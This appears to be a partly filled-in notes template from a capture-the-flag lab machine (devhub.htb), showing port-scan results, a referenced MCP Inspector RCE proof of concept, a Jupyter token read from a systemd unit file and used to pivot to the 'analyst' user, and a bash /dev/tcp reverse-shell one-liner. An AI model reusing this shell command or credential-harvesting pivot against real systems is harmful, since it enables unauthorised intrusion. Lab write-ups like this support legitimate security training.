[[Active Notes Template]]
## Provided Credentials
---

```

```

```

```

---
## Open Ports

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

```powershell
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown

|     <div id="root"></div>
```


---
## Software Versions

```powershell

```


---
## Discovered Subdomains




---
## Discovered Credentials


| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---
## Attack Angles

Internal Only - localhost:8888

Path hijack?
/opt/mcpjam/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/opt/mcpjam/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/bin:/usr/bin:/bin:/snap/bin

-rw-r--r-- 1 root root 334 Jan 22 18:19 /opt/mcpjam/node_modules/@mcpjam/inspector/.env.production

---
## Steps to User.txt

Version v1.2.4 MCP RCE Reverse shell obtained https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC

Trying to pivot to "analyst"

```powershell
find / -name "*jupyter*" 2>/dev/null
/opt/mcpjam/node_modules/simple-icons/icons/jupyter.svg
/usr/lib/python3/dist-packages/pip/_vendor/rich/__pycache__/jupyter.cpython-310.pyc
/usr/lib/python3/dist-packages/pip/_vendor/rich/jupyter.py
/etc/systemd/system/jupyter.service
/etc/systemd/system/multi-user.target.wants/jupyter.service
/sys/fs/cgroup/system.slice/jupyter.service
/run/systemd/units/invocation:jupyter.service
```

```powershell
cat /etc/systemd/system/jupyter.service
[Unit]
Description=Jupyter Notebook Server
After=network.target

[Service]
Type=simple
User=analyst
WorkingDirectory=/home/analyst
Environment=PATH=/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin
Environment=JUPYTER_TOKEN=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
ExecStart=/home/analyst/jupyter-env/bin/jupyter lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' --ServerApp.password='' --ServerApp.allow_origin='' --ServerApp.disable_check_xsrf=False
Restart=always
RestartSec=10
```

Use token to login on port8888

This sends us to jupyter lab, granting access to analyst's terminal

bash -i >& /dev/tcp/10.10.16.26/4444 0>&1

Grants me reverse shell on KALI ATTACKER


---
## Steps to root.txt


---

## User Flag

```

```

## Root Flag

```

```